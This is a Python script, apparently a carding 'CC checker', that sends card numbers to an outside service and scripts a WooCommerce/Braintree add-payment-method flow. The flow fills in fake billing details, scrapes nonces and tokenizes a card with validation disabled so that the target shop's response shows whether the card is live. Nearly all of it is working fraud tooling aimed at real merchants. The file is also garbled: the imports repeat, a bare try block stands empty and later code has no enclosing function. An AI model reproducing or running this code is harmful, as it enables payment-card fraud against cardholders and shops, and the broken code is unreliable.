import base64
import json
import random
import re
import string
import time
from fake_useragent import UserAgent
from FUNC.usersdb_func import *
from FUNC.defs import *
import random
import string
import re
from bs4 import BeautifulSoup
import json
import time
import base64
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import unquote
from urllib.parse import urlparse, parse_qs
try:
            
import os
import requests
import asyncio  # Needed for async operations

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

async def fetch_data(cc):
    clear_screen()
    
    url = f"https://darkboy-b3.onrender.com/key=dark/cc={cc}"
    
    try:
        response = requests.get(url)  # Make the GET request
        response_text = response.text

        # Regex pattern to extract specific content
        pattern = re.compile(r'<div class="message-container container alert-color medium-text-center">.*?</div>', re.DOTALL)
        match = pattern.search(response_text)

        # Check if a match was found
        if match:
            result = match.group(0)
            return result
        else:
            return response_text  # Return full response if no match found

        await asyncio.sleep(0.5)  # Async sleep (not needed here since function ends before reaching this)

    except Exception as e:
        return str(e)

# Example usage
if __name__ == "__main__":
    cc = input("Enter CC: ")  # Prompt user for CC input
    result = asyncio.run(fetch_data(cc))  # Run the async function
    print(result)

        post4 = f"billing_first_name=Sachio&billing_last_name=YT&billing_company=YT&billing_country=US&billing_address_1=118+W+132nd+St&billing_address_2=&billing_city=New+York&billing_state=NY&billing_postcode=10027&billing_phone=19006318646&billing_email={mail}&save_address=Save+address&woocommerce-edit-address-nonce={anonce}&_wp_http_referer=%2Fmy-account%2Fedit-address%2Fbilling%2F&action=edit_address&{c}"

        head4 = {
            "Host": f"{url}",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded",
            "origin": f"https://{url}",
            "referer": f"https://{url}/my-account/edit-address/billing/",
        }

        r4 = await session.post(
            f"https://{url}/my-account/edit-address/billing/",
            headers=head4,
            data=post4,
        )

        r5 = await session.get(
            f"https://{url}/my-account/payment-methods/",
            headers=head4,
        )



        cnonce = gets(r5.text, '"client_token_nonce":"', '"')

        # print(cnonce)

        head6 = {
            "Host": f"{url}",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded",
            "origin": f"https://{url}",
            "referer": f"https://{url}/my-account/payment-methods/",
        }


        r6 = await session.get(
            f"https://{url}/my-account/add-payment-method/",
        )
        # print(r5.text)



        # print(r6.text)
        wnonce = gets(r6.text, '"woocommerce-add-payment-method-nonce" value="', '"')


        # print(wnonce)





        post7 = f"action=wc_braintree_credit_card_get_client_token&nonce={cnonce}"

        r7 = await session.post(
            f"https://{url}/wp-admin/admin-ajax.php",
            headers=head6,
            data=post7,
        )
        ey = gets(r7.text, '"data":"', '"')
        be_1 = base64.b64decode(ey).decode("utf-8")
        be = gets(be_1, '"authorizationFingerprint":"', '"')

        # print(be)

        head8 = {
            "Host": "payments.braintree-api.com",
            "content-type": "application/json",
            "authorization": f"Bearer {be}",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "braintree-version": "2018-05-10",
            "accept": "*/*",
            "origin": "https://assets.braintreegateway.com",
            "referer": "https://assets.braintreegateway.com/",
        }

        post8 = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "dropin2",
                "sessionId": "2eb8e620-9b4b-42d5-be2f-c3249ec470aa",
            },
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": f"{cc}",
                        "expirationMonth": f"{mes}",
                        "expirationYear": f"{ano}",
                        "cvv": f"{cvv}",
                        "cardholderName": "Sachio YT",
                        "billingAddress": {"postalCode": "10027"},
                    },
                    "options": {"validate": False},
                }
            },
            "operationName": "TokenizeCreditCard",
        }

        r8 = await session.post(
            "https://payments.braintree-api.com/graphql",
            headers=head8,
            json=post8,
        )
        tok = gets(r8.text, '"token":"', '"')
        brand_ = gets(r8.text, '"brandCode":"', '"').lower()


        # print(tok)
        # print(brand_)

        head9 = {
            "Host": f"{url}",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded",
            "origin": f"https://{url}",
            "referer": f"https://{url}/my-account/add-payment-method/",
        }

        post9 = f"payment_method=braintree_credit_card&wc-braintree-credit-card-card-type={brand_}&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=&wc-braintree-credit-card-3d-secure-order-total=0.00&wc_braintree_credit_card_payment_nonce={tok}&wc_braintree_device_data=&wc-braintree-credit-card-tokenize-payment-method=true&woocommerce-add-payment-method-nonce={wnonce}&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1&{c}"

        response = await session.post(
            f"https://{url}/my-account/add-payment-method/",
            headers=head9,
            data=post9,
        )

        # response = await session.post(
        #     f"https://{url}/my-account/add-payment-method/",
        #     headers=head9,
        # )



        response=response.text

        # print(response)



        # pattern = re.compile(r'<div class="message-container container alert-color medium-text-center">.*?</div>', re.DOTALL)
        # match = pattern.search(response.text)

        # # Check if a match was found and print it
        # if match:
        #     result = match.group(0)
        #     print(result)
        # else:
        #     print("No match found")

        return response



    except Exception as e:
        return str(e)
